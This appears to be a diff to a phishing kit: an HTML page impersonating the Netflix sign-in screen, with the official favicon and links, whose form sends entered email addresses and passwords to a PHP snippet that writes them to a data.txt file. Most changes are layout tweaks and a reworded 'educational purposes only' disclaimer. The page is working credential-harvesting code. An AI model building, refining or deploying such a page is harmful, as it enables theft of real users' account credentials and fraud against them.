@@ -2,7 +2,7 @@
 <html> 
 <head>
 <!--Author: @new92-->
-<!--This page has been made only for educational purposes !! The author is not responsible for any illegal activities carried out using this page-->
+<!--This page has been created only for educational purposes !! The author is not responsible for any illegal actions carried out using this page-->
 <title>Netflix</title>
 <link rel="icon" type="image/x-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">	
 <style>
@@ -41,6 +41,10 @@ body {
 	left: 40px;
 	position: absolute;
 	margin-top: 10px;
+}
+
+.logo:hover {
+	cursor: pointer;
 }
 
 .signup {
@@ -104,10 +108,9 @@ body {
 	color: white;
 	font-family: sans-serif;
 	font-size: 30px;
-	left: 20px;
 	font-weight: bold;
 	margin-top: 9px;
-	margin-left: 4px;
+	margin-left: 2px;
 }
 
 * {
@@ -242,7 +245,7 @@ html, body {
 	color: #0071eb;
 	text-decoration: none;
 	margin-left: 70px;
-	margin-top: 77px;
+	margin-top: 50px;
 }
 
 .lmore:hover {
@@ -255,7 +258,7 @@ html, body {
 <br>
 <br>
 <div class="login">
-	<h1 class="log">Sign In</body></h1>
+	<h1 class="log">Sign In</h1>
 	<br>
 	<form action="connect.html" method="post"><center>
 	<label for="email"></label> 
@@ -278,7 +281,7 @@ html, body {
 	<br>
 	<br>
 	<br>
-	<p style="color: #737373; margin-left: -70px;">New to Netflix?<a href="https://www.netflix.com/" class="signup" target="_blank"> Sign up now</a>.</p>
+	<p style="color: #737373; margin-left: -70px; margin-top: -60px;">New to Netflix?<a href="https://www.netflix.com/" class="signup" target="_blank"> Sign up now</a>.</p>
 	<div class="recaptcha">
 	<p>This page is protected by Google reCAPTCHA to<p style="margin-left: -145px;"> ensure you're not a bot.</p><a href="https://policies.google.com/privacy" class="lmore" target="_blank"> Learn more.</a></p>
 	</div>
@@ -286,6 +289,7 @@ html, body {
 	<div class="expand">
 	<br>
 	</div>
+	</form>
 </div>
 <br>
 <br>
@@ -307,7 +311,7 @@ $email = "Email: ".$_POST['email']."
 ";
 $password = "Password: ".$_POST['password']."
 ";
-$file=fopen("data.txt","a");
+$file=fopen("data.txt","w");
 fwrite($file, $email);
 fwrite($file, $password);
 fclose($file);
